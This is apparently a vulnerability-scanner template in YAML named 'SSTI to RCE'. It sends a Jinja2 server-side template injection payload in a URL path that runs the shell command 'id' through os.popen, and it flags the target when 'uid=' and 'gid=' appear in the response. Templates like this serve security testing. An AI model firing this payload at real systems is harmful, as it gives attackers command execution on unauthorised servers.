http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  matchers-condition: or
  raw:
  - 'GET /{{url_for.__globals__.os.popen(''id'').read()}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  stop-at-first-match: true
id: ssti-to-rce
info:
  author: reewardius
  name: SSTI to RCE
  severity: critical
  tags: rce,generic
